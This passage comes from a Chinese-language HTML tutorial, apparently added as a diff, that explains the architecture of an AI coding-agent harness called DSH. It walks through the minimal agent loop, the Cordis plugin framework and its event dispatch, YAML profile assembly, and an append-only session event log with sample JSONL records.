+  &quot;messages&quot;: [ {&quot;role&quot;:&quot;system&quot;,&quot;content&quot;:&quot;你是...&quot;},
+                {&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;帮我看看这个报错&quot;},
+                {&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;...&quot;},
+                {&quot;role&quot;:&quot;tool&quot;,&quot;content&quot;:&quot;...&quot;} ],
+  &quot;tools&quot;: [ {...工具的 JSON Schema...} ],
+  &quot;stream&quot;: true
+}</code></pre>
+<p>它返回的不只是一段文字，而是一串<strong>增量片段</strong>（stream chunk）：<code>text-delta</code>、<code>tool-call</code>、<code>usage</code>、<code>finish</code>。这一点非常关键<span class="dash">——</span>因为“流式”决定了整个产品的交互形态，也决定了 harness 必须一边收一边做事（比如把已经吐出来的字显示给用户，同时准备执行工具）。</p>
+<p>由此能推出三条铁律，后面所有设计都是它们的推论：</p>
+<blockquote><p><strong>铁律一 · 没有记忆，只有重发。</strong> 模型「记得」上一轮，是因为你把上一轮的内容又发了一遍。日志丢失 = 记忆丢失。</p></blockquote>
+<blockquote><p><strong>铁律二 · 上下文是唯一的内存，而且按 token 计费。</strong> 每次调用都要把全部历史重新发一遍，所以对话越长越贵、越慢。</p></blockquote>
+<blockquote><p><strong>铁律三 · 历史只能追加，不能修改。</strong> 提供方会缓存请求前缀来省钱（KV Cache），你改动中间一段，后面的缓存全部失效。</p></blockquote>
+<p>记住“免费的东西都很贵”<span class="dash">——</span>把这三条铁律和成本联系起来，你就能理解后面几乎所有的“奇怪设计”：为什么日志是只追加的、为什么压缩不是删除而是“遮蔽”、为什么系统提示词里的固定部分要放在最前面。</p></section><section class="section" id="s-04"><div class="section-header"><div class="section-number">04</div><h2>2 · 最小 agent 循环：20 行伪代码</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">最小可用心智</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">教程一上来就上框架，学完不知道本质是什么</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">先给 20 行伪代码，再往上挂十个子系统</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">伪代码掩盖了并发、失败、取消这些真问题</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">先给「最小可运行心智模型」，再逐层加复杂度</div></div></div></details><p>抛开所有工程细节，一个能跑的 agent 循环长这样：</p>
+<pre><code class="language-text">messages = [system_prompt]
+
+loop:
+    回复 = 调用模型(messages, tools=工具清单)
+
+    if 回复里没有工具调用:
+        把 回复 追加进 messages
+        break                      # 结束：模型认为任务完成了
+
+    把 回复 追加进 messages        # 模型说&quot;我要执行 xxx&quot;
+    for 每个工具调用 in 回复.工具调用:
+        结果 = 执行工具(名字, 参数)
+        把 {role: &quot;tool&quot;, 结果} 追加进 messages   # 结果回灌
+
+    continue                       # 带着工具结果，再问模型一次</code></pre>
+<p>就这么多。你在 DSH 里能看到的所有复杂性，都是在这 20 行外面加东西。</p>
+<p>但请注意这 20 行里已经埋了四个必须回答的问题，而每个问题都会长成一个子系统：</p>
+<figure class="table-wrap"><table><thead><tr><th>这行代码</th><th>立刻会冒出的问题</th><th>长成的子系统</th></tr></thead><tbody><tr><td><code>调用模型(...)</code></td><td>换一家模型怎么办？限流/超时/重试呢？</td><td>LLM 适配层（第 11 章）</td></tr><tr><td><code>system_prompt</code></td><td>这段文字谁写的？里面要放什么？</td><td>系统提示词组装（第 10 章）</td></tr><tr><td><code>执行工具(...)</code></td><td>谁保证参数合法？出错算谁的？要不要先问用户？</td><td>工具流水线与权限（第 12、16 章）</td></tr><tr><td><code>追加进 messages</code></td><td>存在哪？崩溃了怎么办？涨到 100 万 token 怎么办？</td><td>会话日志 + 压缩（第 8、14 章）</td></tr></tbody></table></figure>
+<p>四个问题，就是四个子系统。学 agent 开发，学的就是这四件事各自的标准答案，以及它们之间怎么配合。</p>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>Turn（轮次）</div><div class="dc-body">从“用户说了一句话”到“agent 彻底停下来”，叫一个轮次。</div></div>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>Step（步骤）</div><div class="dc-body">一次模型请求 + 它引发的工具执行，叫一个步骤。一个轮次里可以有 0 个或多个步骤<span class="dash">——</span>0 个的意思是模型一句话没说就把活儿打回来了（比如前置检查没通过）。</div></div>
+<p>把 turn 和 step 分开，是 DSH 一个很值得学的决定：<strong>“用户的一次请求”和“模型的一次调用”不是一回事</strong>。一个“帮我重构这个模块”的请求，可能包含 40 次模型调用。如果只有“调用”这一层，你就没法回答“这一轮到底花了多少 token”“用户这句话什么时候算完成”。</p></section><section class="section" id="s-05"><div class="section-header"><div class="section-number">05</div><h2>3 · Harness 到底要补哪十件事</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">需求排序</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">做出 demo 就以为做出产品，上线第一周就崩</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">不列功能，列「不解决会怎样」——用风险驱动需求</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">恐惧叙事容易导致过度设计</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">评审时问「不做会怎样」，比问「做了有什么好处」更能筛出真需求</div></div></div></details><p>现在可以把“外面那层程序”具体化了。下面这张表就是本文的目录<span class="dash">——</span>每一行都是一个真实存在的工程问题，以及 DSH 里对应的模块名（后面的章节逐个展开）。</p>
+<figure class="table-wrap"><table><thead><tr><th class="al-num">#</th><th>要解决的问题</th><th>不解决会怎样</th><th>DSH 里的对应物</th></tr></thead><tbody><tr><td class="al-num">1</td><td>上下文怎么拼</td><td>模型看不到该看的东西</td><td><code>dsh-system-prompt</code></td></tr><tr><td class="al-num">2</td><td>模型怎么调</td><td>换个模型就改一遍代码</td><td><code>dsh-llm</code> + 适配器</td></tr><tr><td class="al-num">3</td><td>工具怎么给</td><td>模型不知道能干什么</td><td><code>dsh-tools</code> + <code>defineTool</code></td></tr><tr><td class="al-num">4</td><td>动作怎么记账</td><td>崩了就前功尽弃</td><td><code>dsh-session</code>（会话日志）</td></tr><tr><td class="al-num">5</td><td>涨爆了怎么办</td><td>超过窗口直接报错</td><td><code>dsh-compaction-*</code></td></tr><tr><td class="al-num">6</td><td>进程重启了怎么办</td><td>从头再来</td><td><code>dsh-session-persistence-jsonl</code></td></tr><tr><td class="al-num">7</td><td>怎么别把磁盘删了</td><td>一次 <code>rm -rf</code> 结束</td><td><code>dsh-sandbox</code> / <code>dsh-user-approval</code></td></tr><tr><td class="al-num">8</td><td>一个人干不完怎么办</td><td>串行太慢、上下文太脏</td><td><code>dsh-subagent</code> / <code>dsh-workflow</code></td></tr><tr><td class="al-num">9</td><td>怎么长出新能力</td><td>只能改核心代码</td><td>skill / MCP / 插件</td></tr><tr><td class="al-num">10</td><td>人怎么参与</td><td>黑盒，看不见也管不住</td><td>Web Client + API Gateway</td></tr></tbody></table></figure>
+<p>把那十件事标注回最小循环，你就能看出问题都藏在哪：</p>
+<pre><code class="language-text">msgs = [prompt]
+while True:
+    r = call_llm(msgs, tools)              # ② 换模型怎么办？流式怎么收？
+    msgs.append(r)
+    for c in r.tool_calls:                 # ③ 参数谁校验？
+        out = run_tool(c)                  # ⑦ 谁允许它跑的？并发几个？
+        msgs.append(out)
+    save(msgs)                             # ④⑥ 存哪？崩了怎么恢复？
+    if len(msgs) &gt; LIMIT: compress(msgs)   # ⑤ 压什么？怎么压？
+    if r.done: break</code></pre>
+<p>这七行里，几乎每一行都对应一个子系统。<strong>“写 agent”就是把这几行写对的过程。</strong></p>
+<p>十件事，缺一件这个 agent 就只能算 demo。这就是为什么“写一个能跑 20 次的 agent”和“写一个能连续干两小时活的 agent”完全是两个难度<span class="dash">——</span>难点不在模型，在第 4 到第 8 行。</p></section><section class="section" id="s-06"><div class="section-header"><div class="section-number">06</div><h2>4 · 教材概览：DSH 是个什么样的项目</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">规模感</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">新人不知道从哪读，随机游走几天就放弃</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">用真实数字（370 包 / 53 万行 / 220 行 YAML）建立量级感</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">数字会过时，也容易让人望而生畏</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">给新人一张体积地图 + 一条最短路径，比给文档索引有效</div></div></div></details><p>先上一组硬数据，让你对“工业级”有个体感：</p>
+<figure class="table-wrap"><table><thead><tr><th>指标</th><th>数值</th></tr></thead><tbody><tr><td>工作区包（workspace package）</td><td>370 个</td></tr><tr><td>包内源码（<code>packages/<em lang="en">/</em>/src</code> 的 .ts + .tsx，不含测试）</td><td>约 53 万行</td></tr><tr><td>单元测试文件</td><td>1,838 个</td></tr><tr><td>组装一个完整产品用到的插件行数</td><td>基础层 99 行 + Web 层 121 行 ≈ 220 行 YAML</td></tr><tr><td>会话日志里的事件类型</td><td>64 种</td></tr><tr><td>内置工具</td><td>50+ 个（文件、shell、搜索、子任务、定时任务……随 profile 挂载而变）</td></tr><tr><td>仓库体积</td><td>585 MB（含 git 历史）</td></tr></tbody></table></figure>
+<p>53 万行不是让你读完的。它的作用是让你知道：<strong>一个真正的 agent 产品，能被人反复使用而不崩，靠的是这些代码，不是提示词写得好。</strong></p>
+<p>它的设计口号只有一句，写在 README 里：</p>
+<p><strong>Everything is a plugin.</strong>（一切皆插件）</p>
+<p>这句话听起来像营销，但它在这里是字面意思，而且是一个非常硬的技术承诺：模型适配器是插件、工具注册表是插件、会话日志是插件，<strong>连 agent 循环本身都是插件</strong>。也就是说，产品里没有“不许动的内核”。你想换掉循环、换掉存储、换掉权限策略，方式都是“装一个别的插件在旁边”。</p>
+<p>这一条决定了它的目录结构：没有 <code>src/core/</code> 这种中心化目录，只有 59 个“能力分组”，每个分组下是若干独立可发布的 npm 包。</p>
+<pre><code class="language-text">packages/
+  core/        agent / agent-loop / session / tools / system-prompt   ← 骨架
+  llm/         模型适配器（deepseek、pi-ai）与流式词汇表
+  shell/       bash / pwsh 执行
+  fs/          文件读写、搜索、编辑、沙箱围栏
+  sandbox/     进程与文件效果限制
+  session/     持久化、投影、标题、查询、统计
+  compaction/  上下文压缩（压缩器、剪枝、图片卸载）
+  subagent/    子代理与委派
+  workflow/    脚本化多 agent 编排
+  skill/       技能加载
+  mcp/         外部工具协议（MCP）
+  client/      浏览器端 UI 插件（50+ 个）
+  api/         前后端之间的 RPC 控制器
+  bundle/      「组装方案」：base / web-app / headless / sdk
+  ...</code></pre>
+<p>（完整 59 个分组见仓库 <code>AGENTS.md</code> 的 Repository layout 一节。）</p>
+<h3>4.1 三十秒看懂一个陌生 monorepo 的三步法</h3>
+<p>这是我建议你以后拿到任何大型开源项目都先做的三件事，DSH 是个很好的练习对象：</p>
+<ol><li><strong>先看 <code>AGENTS.md</code> 或 <code>CONTRIBUTING.md</code>。</strong> 项目作者写给“AI 和自己的新人”看的文件，通常比 README 信息密度高一个数量级。DSH 的 <code>AGENTS.md</code> 里直接写清了每个目录是干什么的、有哪些必须遵守的工程纪律。</li><li><strong>再找“组装入口”。</strong> 一个系统跑起来时先加载什么？DSH 的答案是 <code>packages/bundle/*/cordis.patch.yml</code><span class="dash">——</span>一份 YAML，220 行，把 200 多个插件按顺序挂上去。读完它，你就知道这个产品“由什么组成”，这比读任何架构图都准。</li><li><strong>最后挑一条主链路顺下去。</strong> 选“用户按回车”这一个动作，从入口一路追到磁盘写盘。这条链路上会经过的每个目录，才是你真正需要读的目录。</li></ol>
+<p>前两步各花一小时，能省下你后面几十小时乱翻的时间。</p></section><section class="section" id="s-07"><div class="section-header"><div class="section-number">07</div><h2>5 · 地基框架 Cordis：五个概念撑起整个项目</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">可替换性</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">换一个零件要动全身，改 A 崩 B</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">一切皆插件，注册即副作用，依赖自动等待</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">抽象层多，出问题时调用链不直观</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">插件化的前提是「每个注册都能撤销」，否则就是负债</div></div></div></details><p>DSH 不是直接写 TypeScript 应用，而是坐在一个叫 <a href="https://github.com/cordiverse/cordis">Cordis</a> 的插件框架上。不理解它，你会觉得源码“到处都在注册、却找不到谁在调用”。</p>
+<p>Cordis 只有五个概念，先把它们认全（每一行后面的括号是它的英文名）：</p>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>插件（Plugin）</div><div class="dc-body">一个做一件事的模块，比如“提供 bash 工具”。</div></div>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>上下文（Context，`ctx`）</div><div class="dc-body">所有服务的登记台。一个服务占据一个稳定的名字，比如 <code>ctx.tools</code>、<code>ctx.llm</code>、<code>ctx.sessions</code>。别的插件靠名字找它，而不是 <code>import</code> 它的实现类。</div></div>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>inject（依赖声明）</div><div class="dc-body">插件说“我需要 <code>ctx.tools</code> 才能启动”。框架负责等你依赖的东西就绪，你不需要手写启动顺序。</div></div>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>类型化事件（Typed Event）</div><div class="dc-body">插件之间发消息。谁想拦截、观察、改写，就挂一个监听器上去。</div></div>
+<div class="def-card def-card-swiss"><div class="dc-term"><span class="dc-label">术语</span>注册即副作用（Registration is an effect）</div><div class="dc-body">你注册的东西，在插件卸载时会自动撤销。不用写 <code>cleanup()</code>。</div></div>
+<p>第五条是这个框架最值钱的地方。</p>
+<p>一个最小插件长这样（真实包的结构就是这样，比如 <code>tool-todo</code>）：</p>
+<pre><code class="language-ts">export const name = 'tool-todo'
+export const inject = ['tools']            // 声明依赖：等 ctx.tools 就绪再启动
+
+export function apply(ctx: Context) {
+  ctx.tools.register(defineTool({ /* ... */ }))   // 注册即副作用：卸载时自动撤销
+}</code></pre>
+<p>没有 <code>new</code>、没有 <code>init()</code>、没有启动顺序表。<strong>依赖自动等待，注册自动回收</strong><span class="dash">——</span>这就是“一切皆插件”能成立的全部原因。</p>
+<p>因为“注册可逆”，才有了后面的热插拔、per-agent 定制、以及“换掉任何一个零件而不动其他人”。</p>
+<h3>5.1 五种事件分发模式（重点）</h3>
+<p>这是 Cordis 里最需要花十分钟搞懂的东西，因为它决定了你写的监听器<strong>有没有权力拦住别人</strong>。</p>
+<figure class="table-wrap"><table><thead><tr><th>模式</th><th>是否等待</th><th>能否返回值</th><th>典型用途</th></tr></thead><tbody><tr><td><code>emit</code></td><td>不等待</td><td>否</td><td>广播通知（“有个工具被注册了”）</td></tr><tr><td><code>waterfall</code></td><td>不等待</td><td>是</td><td><strong>中间件</strong>：包裹、改写、短路</td></tr><tr><td><code>parallel</code></td><td>等待</td><td>否</td><td>并行扇出（“把这件事通知所有关心的人，等都做完”）</td></tr><tr><td><code>serial</code></td><td>等待</td><td>是</td><td>按顺序做决策（“最后一个说话的人定”）</td></tr><tr><td><code>bail</code></td><td>不等待</td><td>是</td><td>第一个给出答案的人说了算</td></tr></tbody></table></figure>
+<p><strong><code>waterfall</code> 是理解 DSH 的钥匙。</strong> 它的调用约定是：每个监听器收到参数和最后一个 <code>next</code> 函数。你调用 <code>next()</code>，控制权交给下游；你不调 <code>next()</code> 直接返回，就是<strong>短路</strong><span class="dash">——</span>下游的人再也看不到这个事件。</p>
+<pre><code class="language-text">// 一个 waterfall 监听器的形状
+ctx.on('tools/pre-execute', async (exec, next) =&gt; {
+  if (该调用是危险操作) return '拒绝：不允许执行'   // 短路，下游看不到
+  return next()                                    // 放行，让下游继续判断
+})</code></pre>
+<p>这就是为什么 DSH 可以在不改循环一行代码的前提下，插进权限检查、审计日志、超时控制、结果改写。<strong>“插件而不是改循环”</strong> 这条纪律，靠的就是 waterfall。</p>
+<p>后面你会反复看到 <code>agent/pre-step</code>、<code>agent/request</code>、<code>tools/pre-execute</code>、<code>tools/execute</code>、<code>tools/post-execute</code>、<code>llm/stream</code> 这些名字<span class="dash">——</span>它们全是 waterfall，全部是可插拔的拦截点。</p></section><section class="section" id="s-08"><div class="section-header"><div class="section-number">08</div><h2>6 · 装配：产品是被一份份 YAML 拼出来的</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">形态与差异</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">Web 和 CLI 两个形态，逼出满地的 if 分支</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">分层 patch 表达差异，连平台差异也写成配置</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">patch 整块替换，覆盖时容易误删配置</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">把产品形态差异收敛进配置，但一定要为覆盖行为设计报错</div></div></div></details><p>现在来看“这个产品是怎么被拼起来的”。这是我认为最值得学的一章，因为它回答了一个通常没人讲的问题：<strong>一个 agent 产品的“配置”到底长什么样。</strong></p>
+<p>DSH 的启动过程是“往一张空桌子上按顺序铺桌布”，一层压一层：</p>
+<pre><code class="language-text">空
+ ├─ 第一层：bundle（组合包）        ← 厂商提供的默认套餐，如 dsh-base
+ ├─ 第二层：bundle（叠加）          ← 如 dsh-web-app，在 base 上加浏览器界面
+ ├─ 第三层：profile 的 cordis.patch.yml  ← 你自己的覆盖
+ └─ 第四层：命令行 --patch          ← 临时实验
+= 运行中的产品（一棵插件树）</code></pre>
+<ul><li><strong>profile</strong>：一套有名字的组装方案（<code>web</code>、<code>headless</code>、<code>sdk</code>、<code>acp</code>）。存在 <code>~/.dsh/profiles/<名字>/</code> 里。</li><li><strong>bundle（组合包）</strong>：一份“插件清单 + 挂载代码”的分发格式，本质就是一个 YAML patch 文件。</li><li><strong>patch</strong>：按 <code>id</code> 定位某一插件行，<strong>替换它的整个 config</strong>，或插入新行。</li></ul>
+<div class="aside-card"><div class="aside-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5"/><path d="M9 18h6"/><path d="M10 22h4"/></svg></div><div class="aside-content"><div class="aside-title">最容易踩的坑</div><p>patch 是「整块替换」而不是「深合并」。你只想改一个字段，也得把想保留的字段全部重述一遍，否则它们会消失。</p></div></div>
+<h3>6.1 实证：220 行 YAML 就是整个产品</h3>
+<p>这不是比喻。基础层 <code>packages/bundle/base/cordis.patch.yml</code> 有 <strong>99 行插件条目</strong>，Web 层 <code>packages/bundle/web-app/cordis.patch.yml</code> 有 <strong>121 行</strong>（其中一部分是覆盖 base 的行）。摘一段真实的：</p>
+<pre><code class="language-yaml">- insert:
+    - id: llm
+      name: '@deepseek-ai/dsh-llm'
+
+    - id: session
+      name: '@deepseek-ai/dsh-session'
+
+    - id: session-persistence-jsonl
+      name: '@deepseek-ai/dsh-session-persistence-jsonl'
+
+    - id: tools
+      name: '@deepseek-ai/dsh-tools'
+
+    - id: tool-fs
+      name: '@deepseek-ai/dsh-tool-fs'
+
+    - id: tool-bash
+      name: '@deepseek-ai/dsh-tool-bash'
+      disabled: !!js process.platform === 'win32'
+
+    - id: compaction-basic
+      name: '@deepseek-ai/dsh-compaction-basic'
+
+    - id: agent-loop
+      name: '@deepseek-ai/dsh-agent-loop'</code></pre>
+<p>看到 <code>disabled: !!js process.platform === 'win32'</code> 了吗？<strong>平台差异也是配置</strong>：Windows 上把 bash 关掉、换成 pwsh 的孪生条目，用的是同一套机制，没有 <code>if (isWindows)</code> 散落在业务代码里。</p>
+<p>再看真实的“用户层”<span class="dash">——</span>这是我机器上 <code>~/.dsh/profiles/web/cordis.patch.yml</code> 的一部分，用户干的只是很朴素的事：换个供应商、关掉一个不想要的侧边栏：</p>
+<pre><code class="language-yaml"># 关掉某个 bundle 插入的侧边栏
+- id: web-ui-better-sidebar
+  name: 'dsh-better-sidebar'
+  disabled: true
+
+# 加一个第三方模型供应商
+- id: llm-pi-ai
+  name: &quot;@deepseek-ai/dsh-llm-pi-ai&quot;
+  config:
+    providers:
+      xiaomi:
+        apiKeyEnv: XIAOMI_API_KEY
+        models:
+          - id: mimo-v2.6-flash
+            contextWindow: 1048576
+            maxTokens: 131072</code></pre>
+<p><strong>这就是“可扩展”最朴素的样子</strong>：不是写代码，是往 YAML 里加一行。你可以直接运行 <code>dsh --profile web --dump-config</code> 把自己机器上真实的插件树打印出来<span class="dash">——</span>这是学习一个 agent 产品最快的方式，比读源码快十倍。</p>
+<h3>6.2 三个“外壳”，同一个内核</h3>
+<p>同一份 <code>dsh-base</code>，套三个不同的壳，就是三个产品：</p>
+<figure class="table-wrap"><table><thead><tr><th>profile</th><th>额外挂载</th><th>形态</th></tr></thead><tbody><tr><td><code>web</code></td><td>+121 行（Web 服务器、API 控制器、50+ 个 UI 插件）</td><td>你正在用的网页版</td></tr><tr><td><code>headless</code></td><td>+2 行（一次性运行器）</td><td>命令行跑一个任务然后退出</td></tr><tr><td><code>sdk</code></td><td>JSON-RPC 服务器</td><td>给别的程序当引擎调用</td></tr></tbody></table></figure>
+<p><strong>内核不变，外壳可换。</strong> 这个分层值得你记在自己项目里：很多人把 UI 逻辑和 agent 逻辑写在一起，结果想加个命令行模式就得重写一遍。</p></section><section class="section" id="s-09"><div class="section-header"><div class="section-number">09</div><h2>7 · 主链路总览：一次回车之后发生了什么</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">认知对齐</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">出问题时没人说得清「一次点击到底发生了什么」</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">七阶段全景图，并标注三处最容易翻车的地方</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">线性叙事会掩盖真实的并发与乱序</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">给团队画一张「一次请求的旅程」，比画系统架构图更能对齐认知</div></div></div></details><p>先把全景看一眼，后面再逐段拆。这是你按回车之后，一个真实 agent 里发生的事情：</p>
+<div class="process"><div class="process-step"><div class="process-num">01</div><div class="process-content"><div class="process-title">输入</div><div class="process-desc">你打字，消息进入收件箱，唤醒循环</div></div></div><div class="process-step"><div class="process-num">02</div><div class="process-content"><div class="process-title">组装</div><div class="process-desc">打开轮次，拼系统提示词，算这一轮能用哪些工具</div></div></div><div class="process-step"><div class="process-num">03</div><div class="process-content"><div class="process-title">请求</div><div class="process-desc">记录请求头，派生模型历史，冻结</div></div></div><div class="process-step"><div class="process-num">04</div><div class="process-content"><div class="process-title">流式</div><div class="process-desc">调模型，token 逐个回来，同时推给界面</div></div></div><div class="process-step"><div class="process-num">05</div><div class="process-content"><div class="process-title">工具</div><div class="process-desc">记账 → 过权限与沙箱 → 执行 → 结果改写</div></div></div><div class="process-step"><div class="process-num">06</div><div class="process-content"><div class="process-title">回灌</div><div class="process-desc">结果写进日志，回到请求，再来一次</div></div></div><div class="process-step"><div class="process-num">07</div><div class="process-content"><div class="process-title">收尾</div><div class="process-desc">轮次结束，持久化，回到空闲</div></div></div></div>
+<p>把它摊成一条时间轴，就是一次真实轮次的节奏（耗时是示意，真实值取决于模型和网络）：</p>
+<pre><code class="language-text"> 0.000s  你按下回车
+ 0.004s  turn/start        ← 轮次打开
+ 0.010s  step/start        ← 第 1 步开始
+ 0.130s  request/header    ← 记下：deepseek-flash、推理强度 high、35 个工具
+ 0.900s  第一个 token 到达 ← 界面开始出字
+ 2.400s  模型说：我要调 bash
+ 2.410s  tool/call → 权限检查 → 执行 → tool/result
+ 2.900s  step/end → 还有工具没跑完？开第 2 步
+ ...
+ 9.800s  step/end（模型不再要工具）→ turn-stopping → turn/end</code></pre>
+<p><strong>注意 0.130s 和 2.900s 这两条</strong>：前者是"信封"被记下来的时刻，后者是"这一步结束"的时刻。没有它们，你事后就没法回答"这次到底用了什么配置、每一步花了多久"。</p>
+<p>这七个阶段里有三处最容易出问题，也是 DSH 花最多代码的地方：<strong>第 4 步和第 5 步之间的结算</strong>（模型说到一半失败怎么办）、<strong>第 6 步的上下文膨胀</strong>（工具结果动辄几万 token）、<strong>第 7 步之后的恢复</strong>（进程被杀，能不能接着干）。</p></section><section class="section" id="s-10"><div class="section-header"><div class="section-number">10</div><h2>8 · 会话日志：整个系统的唯一真相</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">可解释性</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">出了事故，说不清「模型当时到底看到了什么」</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">模型可见 ⟺ 已记录，用事件溯源把可解释性变成结构约束</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">写放大、存储成本高、格式演进要长期维护</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">审计要求高的领域（医疗、金融、安全）值得为可回放付存储钱</div></div></div></details><p>这是全篇最重要的一章。如果只看一节，看这节。</p>
+<p>DSH 的会话不是一个“消息数组”，而是一个<strong>只追加的事件日志</strong>（append-only event log）。这个模式有个正式名字叫 <strong>event sourcing（事件溯源）</strong>：不存“当前状态”，只存“发生过的每一件事”，当前状态由事件重放算出来。</p>
+<p>一个真实会话在磁盘上长这样（我从自己机器上抓的，路径就是设计文档里写的样子）：</p>
+<pre><code class="language-text">~/.dsh/sessions/
+  --home-sakura-my_work-dsh_learn--/          ← 由工作目录生成，让你能按项目找
+    9fb9dfe7-b70a-49ff-87f5-b0379f458342/     ← 一个会话一个目录
+      session.lock
+      session.v4.jsonl.zstd                   ← 当前格式 v4，zstd 压缩</code></pre>
+<p>解开之后，第一行是<strong>头部</strong>（会话身份证）：</p>
+<pre><code class="language-json">{&quot;type&quot;:&quot;session&quot;,&quot;version&quot;:4,&quot;id&quot;:&quot;9fb9dfe7-...&quot;,&quot;cwd&quot;:&quot;/home/sakura/my_work/dsh_learn&quot;,
+ &quot;isSeeded&quot;:false,&quot;origin&quot;:&quot;subagent&quot;,&quot;delegationDepth&quot;:1,&quot;agentPreset&quot;:&quot;standard&quot;}</code></pre>
+<p>后面每一行是一个事件。下面这几条是真实的（我省略了长字段），你对照着看，就是第 7 章那七个阶段在磁盘上的落地版：</p>
+<pre><code class="language-json">{&quot;type&quot;:&quot;turn/start&quot;,&quot;seq&quot;:4,&quot;time&quot;:...,&quot;data&quot;:{&quot;turn&quot;:1}}
+{&quot;type&quot;:&quot;step/start&quot;,&quot;seq&quot;:6,&quot;time&quot;:...,&quot;data&quot;:{&quot;turn&quot;:1,&quot;step&quot;:1}}
+{&quot;type&quot;:&quot;user/message&quot;,&quot;seq&quot;:9,...,&quot;data&quot;:{&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:[{&quot;type&quot;:&quot;text&quot;,&quot;text&quot;:&quot;...&quot;}]}}
+{&quot;type&quot;:&quot;request/header&quot;,&quot;seq&quot;:12,...,&quot;data&quot;:{&quot;header&quot;:{&quot;config&quot;:{&quot;provider&quot;:&quot;deepseek-official&quot;,
+   &quot;model&quot;:&quot;deepseek-flash&quot;,&quot;reasoningEffort&quot;:&quot;high&quot;,&quot;maxTokens&quot;:256000},&quot;tools&quot;:[...]}}}
+{&quot;type&quot;:&quot;tool/call&quot;,&quot;seq&quot;:17,...,&quot;data&quot;:{&quot;turn&quot;:1,&quot;step&quot;:1,&quot;callId&quot;:&quot;call_00_ET_85o...&quot;,
+   &quot;name&quot;:&quot;bash&quot;,&quot;arguments&quot;:&quot;{\&quot;command\&quot;: \&quot;ls\&quot;, ...}&quot;}}
+{&quot;type&quot;:&quot;tool/result&quot;,&quot;seq&quot;:20,...,&quot;data&quot;:{&quot;turn&quot;:1,&quot;step&quot;:1,&quot;toolCallId&quot;:&quot;call_00_ET_85o...&quot;,
+   &quot;message&quot;:{&quot;role&quot;:&quot;tool&quot;,&quot;content&quot;:[{&quot;type&quot;:&quot;text&quot;,&quot;text&quot;:&quot;AGENTS.md\nBENCHMARK.md\n...&quot;}]}}}
+{&quot;type&quot;:&quot;step/end&quot;,...}
+{&quot;type&quot;:&quot;turn/end&quot;,...}</code></pre>
+<p>几个值得注意的细节：</p>
